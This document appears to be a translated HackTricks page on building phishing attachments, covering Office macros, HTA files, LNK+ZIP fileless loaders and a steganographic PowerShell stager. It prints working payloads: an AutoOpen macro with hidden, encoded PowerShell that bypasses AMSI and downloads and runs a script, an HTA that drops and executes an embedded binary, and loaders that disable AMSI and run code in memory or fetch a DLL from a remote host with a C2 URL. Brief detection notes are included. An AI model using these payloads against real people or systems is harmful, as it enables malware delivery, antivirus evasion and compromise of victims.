# Фішингові файли та документи

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word виконує перевірку даних файлу перед відкриттям. Перевірка даних виконується у формі ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникне будь-яка помилка, файл, що аналізується, не буде відкрито.

Зазвичай файли Word, що містять macros, використовують розширення `.docm`. Однак можливо перейменувати файл, змінивши розширення, і при цьому зберегти їхню здатність виконувати macros.\
Наприклад, файл RTF за дизайном не підтримує macros, але файл DOCM, перейменований на RTF, буде оброблено Microsoft Word і зможе виконувати macros.\
Ті самі внутрішні механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint тощо).

Ви можете використати наступну команду, щоб перевірити, які розширення будуть виконуватися деякими програмами Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-файли, які посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), який містить macros, також можуть «виконувати» macros.

### Завантаження зовнішнього зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Можна використовувати macros для запуску довільного коду з документа.

#### Функції автозавантаження

Чим частіше вони використовуються, тим більш імовірно AV їх виявить.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Видалити метадані вручну

Перейдіть до **File > Info > Inspect Document > Inspect Document**, що відкриє Document Inspector. Натисніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Розширення документа

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.

#### Генератори шкідливих макросів

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA файли

HTA — це програма для Windows, яка **поєднує HTML та скриптові мови (such as VBScript and JScript)**. Вона формує інтерфейс користувача і виконується як "fully trusted" application, без обмежень моделі безпеки браузера.

HTA запускається за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, через що **`mshta` залежить від IE**. Тому, якщо він було видалено, HTA не зможуть виконуватися.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Примушування NTLM аутентифікації

Існує кілька способів **примусити NTLM аутентифікацію "віддалено"**, наприклад, ви можете додати **невидимі зображення** в листи або HTML, до яких користувач звернеться (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, яка **спровокує** **аутентифікацію** просто при **відкритті папки.**

**Перегляньте ці ідеї та інші на наступних сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що ви можете не лише вкрасти хеш або аутентифікацію, а й **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Дуже ефективні кампанії доставляють ZIP, який містить два легітимні приманкові документи (PDF/DOCX) та шкідливий .lnk. Суть у тому, що фактичний PowerShell loader зберігається всередині сирих байтів ZIP після унікального маркера, а .lnk вирізає та запускає його повністю в пам'яті.

Типовий ланцюг, реалізований .lnk PowerShell one-liner:

1) Знайти оригінальний ZIP у стандартних шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, та батьківська папка поточної робочої директорії.
2) Прочитати байти ZIP і знайти захардкоджений маркер (наприклад, xFIQCV). Усе після маркера — вбудований PowerShell payload.
3) Скопіювати ZIP до %ProgramData%, розпакувати там та відкрити приманковий .docx, щоб виглядати легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Розобфускувати наступний етап (наприклад, видалити всі символи #) та виконати його в пам'яті.

Приклад PowerShell-скелету для витягання та запуску вбудованого етапу:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Примітки
- Delivery часто зловживає авторитетними PaaS субдоменами (наприклад, *.herokuapp.com) і може gate payloads (віддавати benign ZIPs залежно від IP/UA).
- Наступний етап часто декодує base64/XOR shellcode і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати сліди на диску.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control так, щоб IE/Explorer або будь‑який додаток, який його вбудовує, автоматично перезапускав payload. Див. деталі та готові команди тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Пошук/IOCs
- ZIP файли, що містять ASCII маркерний рядок (наприклад, xFIQCV), доданий до даних архіву.
- .lnk, який переліковує батьківські/користувацькі папки, щоб знайти ZIP і відкрити decoy document.
- AMSI маніпуляції через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Довготривалі бізнес-потоки, що закінчуються посиланнями, розміщеними під trusted PaaS доменами.

## Steganography-delimited payloads in images (PowerShell stager)

Останні ланцюги loader’ів доставляють обфускований JavaScript/VBS, який декодує і запускає Base64 PowerShell stager. Цей stager завантажує зображення (часто GIF), яке містить Base64-encoded .NET DLL, приховану як plain text між унікальними start/end маркерами. Скрипт шукає ці розмежувачі (приклади, зафіксовані “в дикій природі”: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, Base64-декодує його в байти, завантажує assembly в пам'ять і викликає відомий entry method з C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → декодує embedded Base64 → запускає PowerShell stager з -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → завантажує зображення, вирізає маркер-розмежований Base64, завантажує .NET DLL в пам'ять і викликає його метод (наприклад, VAI), передаючи C2 URL та опції.
- Stage 3: Loader отримує фінальний payload і зазвичай інжектить його через process hollowing у trusted binary (зазвичай MSBuild.exe). Дізнайтеся більше про process hollowing і trusted utility proxy execution тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell приклад для вирізання DLL зі зображення і виклику .NET методу в пам'яті:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Примітки
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
- Пошук: скануйте завантажені зображення на наявність відомих роздільників; ідентифікуйте PowerShell, що звертається до зображень і одразу декодує Base64-блоки.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Повторюваний початковий етап — невеликий, сильно обфускований `.js` або `.vbs`, доставлений всередині архіву. Його єдина мета — декодувати вбудований Base64 рядок і запустити PowerShell з `-nop -w hidden -ep bypass` для завантаження наступного етапу по HTTPS.

Схема логіки (у загальному вигляді):
- Зчитати вміст власного файлу
- Знайти Base64 blob між зайвими рядками
- Декодувати до ASCII PowerShell
- Виконати через `wscript.exe`/`cscript.exe`, викликаючи `powershell.exe`

Індикатори для виявлення
- Архівовані вкладення JS/VBS, що запускають `powershell.exe` з `-enc`/`FromBase64String` в командному рядку.
- `wscript.exe`, що запускає `powershell.exe -nop -w hidden` з тимчасових папок користувача.

## Windows файли для викрадення NTLM хешів

Перегляньте сторінку про **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
